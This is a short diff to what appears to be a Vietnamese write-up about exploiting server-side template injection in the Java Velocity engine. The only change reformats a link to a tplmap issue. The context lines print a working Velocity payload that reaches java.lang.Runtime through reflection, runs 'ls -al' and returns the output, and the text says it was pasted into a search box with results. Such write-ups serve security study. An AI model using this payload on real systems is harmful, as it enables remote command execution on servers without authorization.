@@ -20,7 +20,7 @@ Sau khi qua tìm hiểu, mình thấy rằng velocity là 1 Java-based Template.
 
 ``` #set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output ```
 
-``` https://github.com/epinna/tplmap/issues/9 ```
+src: https://github.com/epinna/tplmap/issues/9
 
 Lúc này, ta thử paste đoạn payload kia vào trong ô search keywords và ra được kết quả
 
